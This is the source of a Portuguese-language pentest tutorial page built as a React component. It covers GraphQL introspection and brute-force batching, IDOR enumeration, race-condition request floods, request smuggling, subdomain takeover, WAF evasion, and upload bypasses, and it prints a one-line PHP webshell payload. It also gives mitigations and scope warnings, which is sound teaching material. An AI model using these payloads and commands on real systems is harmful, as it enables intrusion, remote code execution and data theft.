import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";

export default function WebExtras() {
  return (
    <PageContainer
      title="Web: falhas modernas"
      subtitle="GraphQL, IDOR/BOLA, race conditions, request smuggling, subdomain takeover e bypass de WAF/upload"
      difficulty="intermediario"
      timeToRead="24 min"
    >
      <h2>Além do OWASP Top 10 clássico</h2>
      <p>
        Estas falhas aparecem muito em aplicações modernas (APIs, microserviços,
        SPAs) e costumam ficar de fora dos scanners automáticos. Todas exigem
        entender a lógica do alvo — são achados de <em>alto valor</em> em bug
        bounty e pentest.
      </p>
      <AlertBox type="warning" title="Escopo">
        Teste apenas alvos autorizados. Race conditions e smuggling podem
        corromper dados de produção — cuidado redobrado.
      </AlertBox>

      <h2>1. GraphQL</h2>
      <p>
        Um único endpoint (<code>/graphql</code>) onde o cliente monta a query.
        O primeiro passo é <strong>introspection</strong>: pedir o schema
        inteiro e mapear tipos, campos e mutações escondidas.
      </p>
      <CommandTable
        title="Ferramentas e checks"
        variations={[
          { cmd: "graphw00f -d -t https://alvo/graphql", desc: "Fingerprint do engine GraphQL" },
          { cmd: "clairvoyance", desc: "Reconstruir o schema mesmo com introspection desabilitada" },
          { cmd: "InQL (Burp)", desc: "Extensão que mapeia queries/mutations no Burp" },
        ]}
      />
      <CodeBlock
        language="graphql"
        code={`# introspection: revela todo o schema
{ __schema { types { name fields { name } } } }

# batching: varias tentativas numa so request (bypass de rate limit)
[{"query":"mutation{login(u:\"a\",p:\"1\"){token}}"},
 {"query":"mutation{login(u:\"a\",p:\"2\"){token}}"}]`}
      />

      <h2>2. IDOR / BOLA</h2>
      <p>
        <strong>Broken Object Level Authorization</strong> é a falha #1 de APIs:
        trocar um <code>id</code> e acessar dado de outro usuário. Simples e
        devastador.
      </p>
      <PracticeBox
        title="Caçar IDOR"
        goal="Acessar recurso de outro usuário trocando o identificador"
        command={`# 1. logado como usuario A, capture uma request com id
GET /api/v1/invoices/1001 -> seus dados
# 2. incremente/troque o id
GET /api/v1/invoices/1002 -> dados de OUTRO usuario?
# 3. automatize com Burp Intruder ou:
ffuf -u https://alvo/api/v1/invoices/FUZZ -w ids.txt -H "Authorization: Bearer <token_A>" -mc 200`}
        expected="Se retorna dados que não são seus, é IDOR/BOLA"
        verify="Compare o dono do objeto com o token usado"
      />
      <AlertBox type="info" title="Variantes">
        Teste também UUIDs (nem sempre são imprevisíveis), IDs em campos
        aninhados do JSON e a diferença entre <em>ler</em> e <em>alterar</em>
        (BFLA — function level).
      </AlertBox>

      <h2>3. Race conditions</h2>
      <p>
        Enviar várias requisições <strong>simultaneamente</strong> para explorar
        a janela entre “verificar” e “usar”. Clássico em: resgatar cupom várias
        vezes, sacar saldo duas vezes, burlar limites.
      </p>
      <CodeBlock
        language="bash"
        code={`# Turbo Intruder (Burp) com single-packet attack e o melhor
# fora do Burp, dispare em paralelo:
seq 20 | xargs -P20 -I{} curl -s -X POST https://alvo/api/resgatar \\
  -H "Authorization: Bearer <token>" -d 'cupom=BONUS10'`}
      />

      <h2>4. HTTP request smuggling</h2>
      <p>
        Divergencia entre como o <em>front-end</em> (proxy/CDN) e o
        <em> back-end</em> interpretam onde uma request termina
        (<code>Content-Length</code> vs <code>Transfer-Encoding</code>).
        Permite envenenar a fila e sequestrar requests de outros usuários.
      </p>
      <CommandTable
        title="Detecção"
        variations={[
          { cmd: "HTTP Request Smuggler (Burp)", desc: "Extensão do James Kettle: detecta CL.TE / TE.CL automaticamente" },
          { cmd: "smuggler.py", desc: "Scanner standalone de smuggling" },
        ]}
      />
      <OutputBlock type="muted" label="Tipos">
        <p><strong>CL.TE</strong> — front usa Content-Length, back usa Transfer-Encoding.</p>
        <p><strong>TE.CL</strong> — o inverso.</p>
        <p><strong>TE.TE</strong> — ambos usam TE, mas um é enganado por ofuscação do header.</p>
      </OutputBlock>

      <h2>5. Subdomain takeover</h2>
      <p>
        Um registro <code>CNAME</code> aponta para um serviço (S3, GitHub Pages,
        Heroku…) que foi <strong>desprovisionado</strong>. Se você reclama
        aquele recurso, passa a servir conteúdo no subdomínio da vítima.
      </p>
      <PracticeBox
        title="Encontrar takeover"
        goal="Achar subdomínio apontando para serviço órfão"
        command={`# 1. enumere subdominios
subfinder -d alvo.com -silent > subs.txt
# 2. cheque CNAMEs orfaos / fingerprints de takeover
subzy run --targets subs.txt
# ou
nuclei -l subs.txt -t http/takeovers/`}
        expected="Fingerprint de 'NoSuchBucket', '404 There isn't a GitHub Pages site here' etc."
        verify="Confirme o CNAME com dig antes de reportar"
      />

      <h2>6. Bypass de WAF e de upload</h2>
      <CommandTable
        title="WAF"
        variations={[
          { cmd: "Case/encoding (SeLeCt, %53elect, /*!50000*/)", desc: "Variar caixa e encoding para escapar de assinaturas" },
          { cmd: "IP de origem (X-Forwarded-For, X-Real-IP)", desc: "As vezes o WAF confia em headers de origem" },
          { cmd: "nuclei -t http/fuzzing/waf-detect", desc: "Identificar qual WAF esta na frente" },
        ]}
      />
      <CodeBlock
        language="text"
        code={`# bypass de upload: enganar a validacao de extensao/mime
shell.php  ->  shell.php.jpg   (dupla extensao)
shell.phtml / .php5 / .pht     (extensoes alternativas)
Content-Type: image/jpeg       (mas conteudo e PHP)
GIF89a;<?php system($_GET['c']); ?>   (magic bytes de imagem + codigo)`}
      />
      <AlertBox type="danger" title="Cuidado">
        Upload de webshell é execução remota de código real. Só em alvo
        autorizado, e sempre remova o artefato ao final do teste.
      </AlertBox>

      <h2>Defesa (resumo)</h2>
      <OutputBlock type="success" label="Como mitigar">
        <p><strong>GraphQL</strong>: desabilite introspection em prod, limite profundidade/custo, autorize por campo.</p>
        <p><strong>IDOR/BOLA</strong>: valide dono do objeto no servidor a cada request, sempre.</p>
        <p><strong>Race</strong>: locks, transações atômicas e idempotência.</p>
        <p><strong>Smuggling</strong>: normalize/rejeite requests ambíguas; use HTTP/2 fim a fim.</p>
        <p><strong>Takeover</strong>: remova registros DNS ao desprovisionar recursos.</p>
        <p><strong>Upload</strong>: allowlist de extensão, validação de conteúdo, storage fora do webroot.</p>
      </OutputBlock>
    </PageContainer>
  );
}
